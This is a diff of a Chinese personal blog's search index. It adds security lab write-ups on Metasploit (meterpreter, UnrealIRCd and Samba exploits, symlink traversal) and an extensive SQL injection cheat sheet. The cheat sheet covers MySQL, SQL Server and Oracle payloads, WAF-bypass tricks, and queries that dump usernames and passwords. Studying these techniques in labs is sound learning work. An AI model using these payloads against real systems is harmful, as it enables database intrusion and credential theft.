     <content><![CDATA[<h2 id="metasploit之PostgreSQL"><a href="#metasploit之PostgreSQL" class="headerlink" title="metasploit之PostgreSQL"></a>metasploit之PostgreSQL</h2><h3 id="目的：-Metasploit自带数据库（PostgreSQL）操作"><a href="#目的：-Metasploit自带数据库（PostgreSQL）操作" class="headerlink" title="目的： Metasploit自带数据库（PostgreSQL）操作"></a>目的： Metasploit自带数据库（PostgreSQL）操作</h3><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p><code>db_status</code>     查看数据库连接状态</p>
 <p><code>db_connect</code>  链接数据库</p>
 <p><code>db_disconnect</code>    断开连接</p>
@@ -456,8 +445,19 @@
       </tags>
   </entry>
   <entry>
+    <title>first-blog</title>
+    <url>/blog/2021/11/24/first-blog/</url>
+    <content><![CDATA[<h2 id="Test-for-my-first-blog"><a href="#Test-for-my-first-blog" class="headerlink" title="Test for my first blog"></a>Test for my first blog</h2><p>这是正文。</p>
+<p><img src="/blog/blog/2021/11/24/first-blog/image-20211124165347049.png"></p>
+<p>11</p>
+]]></content>
+      <tags>
+        <tag>test</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>metasploit之meterpreter命令</title>
-    <url>/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/</url>
+    <url>/blog/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h2 id="metasploit之meterpreter命令"><a href="#metasploit之meterpreter命令" class="headerlink" title="metasploit之meterpreter命令"></a>metasploit之meterpreter命令</h2><h3 id="目的-了解meterpreter命令"><a href="#目的-了解meterpreter命令" class="headerlink" title="目的: 了解meterpreter命令"></a>目的: 了解meterpreter命令</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><code>ps</code>         查询当前目标机所有进程<br><code>getpid</code>       获取当前会话进程<br><code>getuid</code>       当前用户所用的权限，所在用户组<br><code>sysinfo</code>      取系统信息<br><code>getsystem</code>    提升至system最高权限<br><code>shell</code>      进入cmdshell命令模式<br><code>pwd</code>       查看当前所在位置<br><code>cat</code>        查看文本文件<br><code>ipconfig</code>     查看网络配置信息<br><code>migrate pid</code>   迁移pid<br><code>screenshot</code>    截取当前用户屏幕保存到本地</p>
 <h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msf，<code>use exploit/multi/handler</code>选择exploit，<code>set payload windows/meterpreter/reverse_tcp</code>设置payload，<code>set LHOST 192.168.1.2</code>设置监听主机，<code>set LPORT 11101</code>设置端口</p>
 <p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG"></p>
@@ -486,7 +486,7 @@
   </entry>
   <entry>
     <title>metasploit溢出UnrealIRCd后门漏洞</title>
-    <url>/2021/12/21/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/</url>
+    <url>/blog/2021/12/21/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h2 id="metasploit溢出UnrealIRCd后门漏洞"><a href="#metasploit溢出UnrealIRCd后门漏洞" class="headerlink" title="metasploit溢出UnrealIRCd后门漏洞"></a>metasploit溢出UnrealIRCd后门漏洞</h2><h3 id="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"><a href="#目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限" class="headerlink" title="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"></a>目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限</h3><h3 id="原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"><a href="#原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。" class="headerlink" title="原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"></a>原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。</h3><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>利用nmap扫描主机，确定<code>6667</code>端口开放，对应服务为<code>unreal ircd</code></p>
 <p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.PNG" alt="1"></p>
 <p>终端输入msfconsole，进入msf后输入<code>search unreal ircd</code>，搜索相关工具和攻击载荷</p>
@@ -508,7 +508,7 @@
   </entry>
   <entry>
     <title>pyautogui的简单基础</title>
-    <url>/2021/11/24/pyautogui%E7%9A%84%E7%AE%80%E5%8D%95%E5%9F%BA%E7%A1%80/</url>
+    <url>/blog/2021/11/24/pyautogui%E7%9A%84%E7%AE%80%E5%8D%95%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h2 id="pyautogui的简单基础"><a href="#pyautogui的简单基础" class="headerlink" title="pyautogui的简单基础"></a>pyautogui的简单基础</h2><h3 id="安装pyautogui"><a href="#安装pyautogui" class="headerlink" title="安装pyautogui"></a>安装pyautogui</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip install pyautogui</span><br></pre></td></tr></table></figure>
 
 <h3 id="查看屏幕大小"><a href="#查看屏幕大小" class="headerlink" title="查看屏幕大小"></a>查看屏幕大小</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line"><span class="built_in">print</span>(pag.size())            <span class="comment">#左上角坐标为(0,0)</span></span><br></pre></td></tr></table></figure>
@@ -532,8 +532,23 @@
       </tags>
   </entry>
   <entry>
+    <title>python永久换第三方库国内源</title>
+    <url>/blog/2021/11/24/python%E6%B0%B8%E4%B9%85%E6%8D%A2%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%9B%BD%E5%86%85%E6%BA%90/</url>
+    <content><![CDATA[<h2 id="python永久换第三方库国内源"><a href="#python永久换第三方库国内源" class="headerlink" title="python永久换第三方库国内源"></a>python永久换第三方库国内源</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> global.index<span class="literal">-url</span> https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
+
+<p> 国内靠谱的 pip 镜像源有：</p>
+<p>(1)清华: <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p>
+<p>(2)豆瓣: <a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></p>
+<p>(3)阿里: <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></p>
+]]></content>
+      <tags>
+        <tag>python</tag>
+        <tag>pip</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>redrock-wp-2021</title>
-    <url>/2021/11/24/redrock-wp-2021/</url>
+    <url>/blog/2021/11/24/redrock-wp-2021/</url>
     <content><![CDATA[<h2 id="redrockcrf-wp"><a href="#redrockcrf-wp" class="headerlink" title="redrockcrf        wp"></a>redrockcrf        wp</h2><h2 id="MSIC"><a href="#MSIC" class="headerlink" title="MSIC"></a>MSIC</h2><h3 id="一眼看不出flag："><a href="#一眼看不出flag：" class="headerlink" title="一眼看不出flag："></a>一眼看不出flag：</h3><p>题目：-…/.-/.-/-…/.-/.-/-…/-…/-…/.-/.-/.-/-…/.-/.-/.-/.-/.-/.-/.-/-…/.-/.-/-…/.-/-…/-…/.-/.-/.-</p>
 <p>摩斯密码，在线解密，得到BAABAABBBAAABAAAAAAABAABABBAAA，是培根密码，解密结果是soeasy,提交redrock{soeasy}；</p>
 <h3 id="ELMA："><a href="#ELMA：" class="headerlink" title="ELMA："></a>ELMA：</h3><p>题目：<img src="https://gitee.com/oxchang/img-host/raw/master/redrock-wp-2021/cover.png" alt="cover"></p>
@@ -691,23 +706,8 @@
       </tags>
   </entry>
   <entry>
-    <title>python永久换第三方库国内源</title>
-    <url>/2021/11/24/python%E6%B0%B8%E4%B9%85%E6%8D%A2%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%9B%BD%E5%86%85%E6%BA%90/</url>
-    <content><![CDATA[<h2 id="python永久换第三方库国内源"><a href="#python永久换第三方库国内源" class="headerlink" title="python永久换第三方库国内源"></a>python永久换第三方库国内源</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> global.index<span class="literal">-url</span> https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
-
-<p> 国内靠谱的 pip 镜像源有：</p>
-<p>(1)清华: <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p>
-<p>(2)豆瓣: <a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></p>
-<p>(3)阿里: <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></p>
-]]></content>
-      <tags>
-        <tag>python</tag>
-        <tag>pip</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>samba提权</title>
-    <url>/2021/12/20/samba%E6%8F%90%E6%9D%83/</url>
+    <url>/blog/2021/12/20/samba%E6%8F%90%E6%9D%83/</url>
     <content><![CDATA[<h2 id="samba提权"><a href="#samba提权" class="headerlink" title="samba提权"></a>samba提权</h2><h3 id="利用samba漏洞，获得目标主机root权限"><a href="#利用samba漏洞，获得目标主机root权限" class="headerlink" title="利用samba漏洞，获得目标主机root权限"></a>利用samba漏洞，获得目标主机root权限</h3><h4 id="原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"><a href="#原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。" class="headerlink" title="原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"></a>原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。</h4><h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><p>确定目标存在<code>445</code>和<code>139</code>端口开放，使用msf，输入命令<code>search samba</code></p>
 <p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220184011444.png" alt="image-20211220184011444"></p>
 <p>使用命令<code>use exploit/multi/samba/usermap_script</code>，启用漏洞利用模块，终端输入<code>info</code>，查看相关信息</p>
@@ -725,56 +725,45 @@
   </entry>
   <entry>
     <title>sql注入</title>
-    <url>/2021/12/28/sql%E6%B3%A8%E5%85%A5/</url>
+    <url>/blog/2021/12/28/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="sql-注入"><a href="#sql-注入" class="headerlink" title="sql 注入"></a>sql 注入</h2><h3 id="一般过程"><a href="#一般过程" class="headerlink" title="一般过程"></a>一般过程</h3><ol>
 <li>找到网站注入点</li>
-<li>判断注入点是字符型还是数字型注入（使用减法，使用and 1=1）</li>
+<li>判断注入点是字符型还是数字型注入（使用减法，使用<code>and 1=1</code>）</li>
 <li>判断闭合方式（fuzz，仅限于字符型注入）</li>
-<li>判断前一条sql查询列数（group by 、 order by容易waf检测）</li>
-<li>查询回显位（仅限union注入）<ul>
-<li><code>?id=-1 union select 1,2,3</code></li>
-</ul>
-</li>
+<li>判断前一条sql查询列数（推荐<code>group by</code> 、 <code>order by</code>容易waf检测）</li>
+<li>查询回显位（仅限union注入） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure></li>
 <li>查询当前数据库库名</li>
 <li>查询当前数据库所有表名<ul>
-<li><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</code></li>
+<li><strong>table_name</strong>表示表名，mysql数据库有<strong>information_schema</strong>数据库,存放了表名，列名，<strong>information_schema.tables</strong>是存放所有表名的表，<strong>information_schema.columns</strong>是存放所有列名的表，<strong>table_schema</strong>是数据库的名称，<strong>table_name</strong>是存放表名的列（是information_schema.tables的属性）,<strong>group_concat</strong>可以一行显示多个数据<br><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</code></li>
 </ul>
 </li>
-<li>查询当前数据所有列名 users<ul>
-<li><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;</code></li>
-</ul>
-</li>
-<li>查询当前数据表所有列项 id,username,password<ul>
-<li><code>?id=-1 union select 1,2,group_concat(id,&#39;~&#39;,username) from users</code></li>
-</ul>
-</li>
+<li>查询当前数据所有列名,<strong>column_name</strong>是存放所有列名的列,<strong>information_schema.columns</strong>包含了<strong>table_name</strong>属性<br> <code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;</code></li>
+<li>查询当前数据表所有列项 <strong>id,username,password</strong><br> <code>?id=-1 union select 1,2,group_concat(id,&#39;:&#39;,username,&#39;****&#39;) from users</code></li>
 </ol>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>原理：优先执行括号内的内容,报错注入最多一次只能显示32个字符</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>原理：优先执行括号内的内容,报错注入最多一次只能显示<em>32</em>个字符</p>
 <ol>
-<li><p>extractvalue报错注入</p>
+<li><p><strong>extractvalue</strong>报错注入</p>
 <ul>
-<li><p>数据库读取XML文件，extractvalue(书名，路径)，路径格式必须是<code>/</code>，否则报错</p>
-</li>
-<li><p>concat(0x7e,(select database()))组合参数</p>
-</li>
-<li><p><code>?id=-1&#39; and 1=extractvalue(1,concat(0x7e,(select database()))) --+</code></p>
-</li>
-<li><p>substring(‘test’,x,y)，从第x个字符开始，显示y个字符 </p>
-</li>
-<li><p>解决只能返回32个字符串问题<br><code>?id=-1&#39; and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,&#39;~&#39;,password),25,30)))) --+ /*从第25个字符往后再显示30个字符*/</code> </p>
-</li>
+<li>数据库读取XML文件，**extractvalue(书名，路径)**，路径格式必须是<code>/</code>,否则报错</li>
+<li><strong>concat(0x7e,(select database)))</strong> 组合参数,concat用于连接字符串，若有一个参数为null，则返回null<br><code>?id=-1&#39; and 1=extractvalue(1,concat(0x7e,(select database()))) --+</code></li>
+<li>**substring(‘test’,x,y)**，从第x个字符开始，显示y个字符 </li>
+<li>解决只能返回32个字符串问题<br><code>?id=-1&#39; and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,&#39;~&#39;,password),25,30)))) --+ /*从第25个字符往后再显示30个字符*</code> </li>
 </ul>
 </li>
 <li><p>updatexml报错注入</p>
 <ul>
-<li>updatexml()修改文档，三个参数，第二个参数为路径</li>
-<li><code>id=1&#39; and 1=updatexml(1,concat(0x7e,(select databse())),3) --+</code></li>
-<li><code>?id=1 union select 1,2,updatexml(1,concat(0x7e,(select database())),3) --+</code></li>
+<li>updatexml()修改文档，三个参数，第二个参数为路径<br><code>id=1&#39; and 1=updatexml(1,concat(0x7e,(select databse())),3) --+</code><br><code>?id=1 union select 1,2,updatexml(1,concat(0x7e,(select database())),3) --+</code></li>
+</ul>
+<p> <code>SELECT concat_ws(&#39;-&#39;,2.3);</code><br> <code>SELECT concat_ws(&#39;-&#39;,database(),floor(rand()*2));</code><br> <code>select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand(0)*2)) as cc from information_schema.tables group by cc;</code></p>
+</li>
+<li><p>floor报错注入</p>
+<ul>
+<li>floor,count,group by冲突报错</li>
+<li>注入语句<code>and select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></li>
 </ul>
 </li>
 </ol>
-<p><code>SELECT concat_ws(&#39;-&#39;,2.3);</code><br><code>SELECT concat_ws(&#39;-&#39;,database(),floor(rand()*2));</code><br><code>select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand(0)*2)) as cc from information_schema.tables group by cc;</code></p>
-<ol start="3">
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><ol start="3">
 <li>布尔盲注<ul>
 <li>页面不会报错，页面有两种状态，一种真值，一种假值<br><code>?id=1&#39; and ascii(substring((select database()),2,1))=101 --+</code></li>
 </ul>
@@ -785,6 +774,101 @@
 <p> <code>select if(1&gt;2,2,sleep(2));</code></p>
 </li>
 </ol>
+<h3 id="绕过防火墙"><a href="#绕过防火墙" class="headerlink" title="绕过防火墙"></a>绕过防火墙</h3><ol>
+<li><p>preg_replace($reg,$replace.$id)，替换函数</p>
+</li>
+<li><p>双写绕过</p>
+</li>
+<li><p>大小写绕过</p>
+</li>
+<li><p>替换</p>
+<ul>
+<li>order by = group by</li>
+<li>union select = union all select</li>
+</ul>
+</li>
+<li><p>混淆</p>
+<ul>
+<li>注释：/*xxxx*/      /*!50000 version()*/   <em>!会执行注释里的内容，版本大于5.0就会执行version()命令</em><br><code>?id=-1&#39; union /*!99999xxx*/ select 1,2,3,4 --+</code><br><code>?id=-1&#39; union /*!99999xxx*/ select 1,2,database(/*!99999 xxx*/) --+</code></li>
+<li>换行：  +(空格)   %0A(换行，–+只注释当前行，换行后不注释)</li>
+<li>换行加注释： %0a –+ xxx<br><code>?id=-1&#39; union /*!50000 --+/*%0a select 1,2,database() */ --+</code></li>
+</ul>
+</li>
+</ol>
+<p>php?id=  ———&gt;mysql</p>
+<p>asp?id=  ———&gt;access sql server</p>
+<p>jsp?id=  ———&gt; oracle</p>
+<h3 id="sql-server-注入"><a href="#sql-server-注入" class="headerlink" title="sql server 注入"></a>sql server 注入</h3><ol>
+<li><p>常见查询函数</p>
+<ul>
+<li><p>select @@version; 数据库版本</p>
+</li>
+<li><p>select @@servername; 查询服务名</p>
+</li>
+<li><p>select host_name(); 查询主机名，如果用vnavicat远程连接，主机名是本地名字</p>
+</li>
+<li><p>select db_name； 查询当前数据库名</p>
+</li>
+<li><p>select user; 查询当前数据库的拥有者，结果为dbo。dbo 是每个数据库的默认用户，具有所有者权限，databaseOwner</p>
+</li>
+<li><p>只能使用order by函数查询列数</p>
+</li>
+<li><p>for xml path(‘’)===gropu_concat()<br><code>select * from user for xml path(&#39;&#39;)</code></p>
+</li>
+<li><p>quotename(表名)<br><code>select quotename() from user for xml path(&#39;&#39;)</code><br><code>?id=0&#39; union select 1,2,(select quotename(table_name) from information_schema.tables for xml path(&#39;&#39;)) --+</code><br><code>?id=0&#39; union select 1,2,(select quotename(column_name) from information_schema.columns where table_name=&#39;users&#39; for xml path(&#39;&#39;)) --+</code></p>
+</li>
+<li><p>sql server 排除法</p>
+</li>
+<li><p>where 列名 not in 排除法<br><code>where name not in(&#39;database1&#39;,&#39;database2&#39;)</code></p>
+</li>
+<li><p>master..sysdatabases获取数据库名<br><code>?id=0&#39; union select 1,2,name from master..sysdatabases where name not in(&#39;master&#39;,&#39;model&#39;,&#39;msdb&#39;,&#39;ReportServer&#39;,&#39;ReportServerTempDB&#39;) --+</code></p>
+</li>
+<li><p>sys.sysobjects表，存放所有数据库表名的表，xtype是S是system，U是user<br><code>?id=0&#39; union select 1,2,name from sysobjects where xtype=&#39;U&#39; --+</code></p>
+</li>
+<li><p>sys.syscolumns表，存放所有数据库列名的表，通过id确定表<br><code>?id=0&#39; union select 1,2,name from syscolumns where id=(select id from sysobjects where name=&#39;users&#39; and xtype=&#39;U&#39;) and name not in (&#39;id&#39;) --+</code></p>
+</li>
+</ul>
+</li>
+<li><p>报错注入</p>
+<ul>
+<li><code>?id=0&#39; and 1=(@@version) --+</code></li>
+<li><code>?id=1&#39; and 1=(select quotename(table_name) from information_schema.tables for xml path(&#39;&#39;)) --+</code></li>
+<li>convert()把时间定义一个数据类型<ul>
+<li>convert(data_type(length),data_to_beconverted,style)</li>
+</ul>
+</li>
+<li>cast()将数据类型转换为另一种数据类型<ul>
+<li>select cast(@@version as int)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>布尔盲注</p>
+<ul>
+<li><code>/?id=1&#39; and ascii(substring(db_name(),1,1))&gt;100 --+</code></li>
+</ul>
+</li>
+<li><p>时间盲注</p>
+<ul>
+<li>waitfor delay ‘00:00:02’查询动作等待2秒后反馈结果<ul>
+<li><code>if(ascii(substring((db_name()),1,1))&gt;100) begin waitfor delay &#39;00:00:00&#39; end else begin waitfor delay &#39;00:00:02&#39; end --+</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="oracle-注入"><a href="#oracle-注入" class="headerlink" title="oracle 注入"></a>oracle 注入</h3><ol>
+<li>数据类型保持一致<ul>
+<li>判断数据类型，dual是oracle的虚表<br><code>?id=0&#39; union select &#39;1&#39;,null,null from dual --+</code>出现报错，则第一个数据类型为整形，若没有报错，则为字符型<br><code>?id=1&#39; union select 1,&#39;2&#39;,&#39;3&#39; from dual --+</code>判断回显位</li>
+<li>wm_concat(),多行变一行，user_tables是表名，user_tab_columns是列名<ul>
+<li><code>?id=1&#39; union select 1,&#39;2&#39;,(select wm_concat(table_name) from user_tables) from dual --+</code></li>
+<li><code>?id=1&#39; union select 1,&#39;2&#39;,(select wm_concat(column_name) from user_tab_columns where table_name=&#39;USER&#39;) from dual --+</code></li>
+<li><code>?id=1&#39; union select 1,&#39;2&#39;,(select wm_concat(column_name) from user_tab_columns where table_name=&#39;USERS&#39;) from dual --+</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
 ]]></content>
       <tags>
         <tag>sql</tag>
@@ -793,7 +877,7 @@
   </entry>
   <entry>
     <title>sysmlink漏洞</title>
-    <url>/2021/12/20/sysmlink%E6%BC%8F%E6%B4%9E/</url>
+    <url>/blog/2021/12/20/sysmlink%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h2 id="sysmlink-目录遍历漏洞"><a href="#sysmlink-目录遍历漏洞" class="headerlink" title="sysmlink 目录遍历漏洞"></a>sysmlink 目录遍历漏洞</h2><h3 id="利用sysmlink漏洞读取目标主机的passwd文件内容"><a href="#利用sysmlink漏洞读取目标主机的passwd文件内容" class="headerlink" title="利用sysmlink漏洞读取目标主机的passwd文件内容"></a>利用sysmlink漏洞读取目标主机的passwd文件内容</h3><h4 id="原理：Samba是一套实现SMB（server-messages-block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含-的目录遍历符的软连接-，可以进行目录遍历以及访问任意文件。"><a href="#原理：Samba是一套实现SMB（server-messages-block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含-的目录遍历符的软连接-，可以进行目录遍历以及访问任意文件。" class="headerlink" title="原理：Samba是一套实现SMB（server messages block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含..的目录遍历符的软连接 ，可以进行目录遍历以及访问任意文件。"></a>原理：Samba是一套实现SMB（server messages block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含..的目录遍历符的软连接 ，可以进行目录遍历以及访问任意文件。</h4><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>使用<code>nmap -sV ip</code> 扫描主机，确认开放<code>445</code>，<code>139</code>端口且安装了<code>samba</code>服务，版本为3</p>
 <p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220165606561.png" alt="image-20211220165606561"></p>
 <p>命令行输入<code>search samba</code>，搜索samba的相关工具和载荷。</p>
@@ -818,7 +902,7 @@
   </entry>
   <entry>
     <title>中国菜刀配合一句话木马基本使用</title>
-    <url>/2021/12/27/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
+    <url>/blog/2021/12/27/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h2 id="中国菜刀配合一句话木马基本使用"><a href="#中国菜刀配合一句话木马基本使用" class="headerlink" title="中国菜刀配合一句话木马基本使用"></a>中国菜刀配合一句话木马基本使用</h2><p>目的：</p>
 <ul>
 <li>学习一句话木马</li>
@@ -858,7 +942,7 @@
   </entry>
   <entry>
     <title>代码混淆</title>
-    <url>/2021/12/27/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</url>
+    <url>/blog/2021/12/27/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</url>
     <content><![CDATA[<h2 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h2><p>目的：</p>
 <ul>
 <li>JAVA编程实现Android手机代码混淆，并使用反编译查看效果</li>
@@ -868,107 +952,64 @@
 <li>代码混淆(Obfuscated code)亦称花指令，是保护APP常见技术之一，方法是将程序代码转换成一种功能上等价，但是难于阅读和理解的形式，本实验介绍使用代码混淆技术对抗静态分析。混淆就是对发布出去的程序进行重新组织和处理，使得处理后的代码与处理前代码完成相同的功能，而混淆后的代码很难被反编译，即使反编译成功也很难得出程序的真正语义。被混淆过的程序代码，仍然遵照原来的档案格式和指令集，执行结果也与混淆前一样，只是混淆器将代码中的所有变量、函数、类的名称变为简短的英文字母代号，在缺乏相应的函数名和程序注释的情况下，即使被反编译，也将难以阅读。同时混淆是不可逆的，在混淆的过程中一些不影响正常运行的信息将永久丢失，这些信息的丢失使程序变得更加难以理解。混淆器的作用不仅仅是保护代码，它也有精简编译后程序大小的作用。由于以上介绍的缩短变量和函数名以及丢失部分信息的原因，编译后jar文件体积大约能减少25% ，这对当前费用较贵的无线网络传输是有一定意义的。</li>
 </ul>
 <p>过程：</p>
-<p>打开Eclipse，依次按照New-Project的顺序点击，然后选择 Android Application Project，新建一个可以执行的工程<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229092846142.png" alt="image-20211229092846142"></p>
-<p>添加应用名称与项目名称（name为SimpleEdu23,第一个SDK选择API14，其余默认），其他设置默认选择<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229092927117.png" alt="image-20211229092927117"></p>
-<p>点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093002017.png" alt="image-20211229093002017"></p>
-<p>选择相应位置，点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093028747.png" alt="image-20211229093028747"></p>
-<p>选择Blank Activity，点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093051916.png" alt="image-20211229093051916"></p>
-<p>输入Activity名称等信息，点击finish<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093159974.png" alt="image-20211229093159974"></p>
-<p>打开android工程的project.properties文件<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093358762.png" alt="image-20211229093358762"></p>
-<p>在project.properties文件中增加下面一行代码proguard.config=prouard-project.txt<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093451991.png" alt="image-20211229093451991"></p>
